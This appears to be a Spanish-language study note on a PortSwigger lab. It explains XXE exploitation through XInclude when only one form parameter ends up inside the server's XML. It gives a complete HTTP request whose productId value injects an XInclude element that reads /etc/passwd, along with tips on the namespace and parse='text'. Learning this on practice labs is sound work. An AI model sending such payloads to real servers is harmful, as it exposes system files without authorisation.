---
aliases:
  - XXE 003 - XInclude sin controlar el XML
  - xinclude attack
tags:
  - vuln/xxe
  - example
  - portswigger
---

# 003 — XInclude (cuando NO controlás el XML entero)

> Lab: [Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack) · **Practitioner** · técnica → [[vulnerabilities/006-xxe/xxe|entry point]]

## ¿Por qué acá?
- **Vengo de [[vulnerabilities/006-xxe/examples/001-leer-archivo-in-band|001]]:** ahí ponía mi propio `<!DOCTYPE>` porque controlaba **todo** el XML.
- **Por qué no me alcanza:** acá mando solo **un parámetro** (`x-www-form-urlencoded`) que el server mete en **su** XML. No puedo declarar `<!DOCTYPE>` ni entidades → los payloads de 001/002 no entran.
- **Entonces:** **XInclude**, que se inyecta **a nivel de valor**, sin necesitar DOCTYPE.

## Cómo explotarlo
La request **no** es XML: es `application/x-www-form-urlencoded`. Editás el **valor** de `productId`:
```http
POST /product/stock HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 145

productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
El valor de `productId` pasa a ser:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## Verificación
La respuesta refleja el contenido de `/etc/passwd`.

## Detalles que se pasan por alto
- **`Content-Type` acá es `x-www-form-urlencoded`** (¡no XML!). Editás el **valor del parámetro**, no el body entero — esa es toda la diferencia con [[vulnerabilities/006-xxe/examples/001-leer-archivo-in-band|001]].
- Hace falta el **namespace** `xmlns:xi="http://www.w3.org/2001/XInclude"` en el raíz o no se procesa.
- `parse="text"` para leer como texto plano (si no, intenta parsear el archivo como XML y falla).

→ **Siguiente:** ¿y si la entrada no es un campo sino una **imagen**? → [[vulnerabilities/006-xxe/examples/004-xxe-por-subida-de-svg|004 — subida de SVG]].
